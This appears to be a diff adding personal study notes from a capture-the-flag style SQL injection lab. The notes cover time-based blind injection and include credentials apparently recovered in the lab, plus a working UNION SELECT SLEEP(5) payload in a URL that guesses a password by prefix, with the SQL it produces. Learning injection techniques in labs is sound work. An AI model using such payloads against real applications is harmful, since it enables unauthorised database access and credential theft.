@@ -1,0 +1,23 @@
++2
+Article ID: 1
+
+admin:p4ssword
+martin:pa$$word
+jim:work123
+
+
+Time based blind sqli
+
+Like the previous section but we try to make the database sleep for 5 seconds to extend the request time. When our request is true we get a 5 second delay
+Otherwise the database returns quickly )0.001/2 secs.
+
+Use similar statements as before just with a sleep command. find
+
+database: sqli_four
+username: admin
+password: 4961
+
+https://website.thm/analytics?referrer=admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin%' and password like '4961%'; --
+
+creates the SQL statement:
+select * from analytics_referrers where domain='admin123' UNION SELECT SLEEP(5),2 from users where username like 'admin%' and password like '4961%'; --' LIMIT 1
